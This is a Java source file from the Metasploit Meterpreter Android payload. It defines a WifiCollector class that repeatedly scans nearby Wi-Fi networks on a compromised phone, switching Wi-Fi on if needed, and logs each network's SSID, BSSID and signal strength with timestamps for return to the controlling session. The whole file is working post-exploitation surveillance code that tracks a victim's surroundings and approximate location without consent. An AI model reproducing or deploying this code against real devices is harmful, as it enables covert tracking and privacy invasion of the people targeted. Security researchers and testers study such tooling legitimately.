package com.metasploit.meterpreter;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;

import android.net.ConnectivityManager;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;

import com.metasploit.meterpreter.android.interval_collect;

import java.io.IOException;

import java.lang.InterruptedException;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Hashtable;

public class WifiCollector extends IntervalCollector {
    private final Context context;
    private final Object syncObject = new Object();

    private Hashtable<Long, List<ScanResult>> collections = null;
    private WifiReceiver receiver = null;

    private class WifiReceiver extends BroadcastReceiver {

        private final Context context;
        private final Object syncObject = new Object();
        private final long timeout;

        private WifiManager wifiManager;
        private List<ScanResult> results;
        private boolean wifiAlreadyRunning = false;

        public WifiReceiver(Context context, long timeout) {
            this.context = context;
            this.timeout = timeout;
        }

        @Override
        public void onReceive(Context c, Intent intent) {
            synchronized (this.syncObject) {
                this.results = this.getWifiManager().getScanResults();
                this.syncObject.notifyAll();
            }
        }

        public List<ScanResult> runScan() {
            this.wifiAlreadyRunning = this.getWifiManager().isWifiEnabled();

            if (!this.wifiAlreadyRunning) {
                this.getWifiManager().setWifiEnabled(true);
            }

            this.context.registerReceiver(this, new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));

            List<ScanResult> results = null;
            if (this.getWifiManager().startScan()) {
                synchronized (this.syncObject) {
                    try {
                        // TODO: determine if this is a valid thing to do
                        this.syncObject.wait(30000);

                        if (!this.wifiAlreadyRunning) {
                            this.getWifiManager().setWifiEnabled(false);
                        }

                        results = this.results;
                        this.results = null;
                    }
                    catch (InterruptedException ex) {
                        // timed out, so just exit without results
                    }
                }
            }

            this.context.unregisterReceiver(this);

            return results;
        }

        private WifiManager getWifiManager() {
            if (this.wifiManager == null) {
                this.wifiManager = (WifiManager)this.context.getSystemService(Context.WIFI_SERVICE);
            }
            return this.wifiManager;
        }
    }

    public WifiCollector(long timeout, Context context) {
        super(timeout);
        this.context = context;
        this.collections = new Hashtable<Long, List<ScanResult>>();
    }

    public void collect() {
        List<ScanResult> results = this.receiver.runScan();
        if (results != null) {
            synchronized (this.syncObject) {
                this.collections.put(System.currentTimeMillis(), results);
            }
        }
    }

    public void init() {
        if (this.receiver == null) {
            this.receiver = new WifiReceiver(this.context, this.getTimeout());
        }
    }

    public void deinit() {
        this.receiver = null;
    }

    public boolean dump(TLVPacket packet) {
        Hashtable<Long, List<ScanResult>> collections = this.collections;

        synchronized (this.syncObject) {
            // create a new collection, for use on the other thread
            // if it's running
            this.collections = new Hashtable<Long, List<ScanResult>>();
        }

        List<Long> sortedKeys = new ArrayList<Long>(collections.keySet());
        Collections.sort(sortedKeys);

        for (Long ts : sortedKeys) {
            long timestamp = ts.longValue();
            List<ScanResult> scanResults = collections.get(timestamp);

            TLVPacket resultSet = new TLVPacket();

            try {
                resultSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_TIMESTAMP, timestamp / 1000);
            }
            catch (IOException ex) {
                // not good, but not much we can do here
            }

            for (int i = 0; i < scanResults.size(); ++i) {
                ScanResult result = scanResults.get(i);
                TLVPacket wifiSet = new TLVPacket();

                try {
                    wifiSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_SSID, result.SSID);
                    wifiSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_BSSID, result.BSSID);
                    wifiSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_LEVEL, result.level);

                    resultSet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI, wifiSet);
                }
                catch (IOException ex) {
                    // not good, but not much we can do here
                }
            }

            try {
                packet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GROUP, resultSet);
            }
            catch (IOException ex) {
                // not good, but not much we can do here
            }
        }

        return true;
    }
}
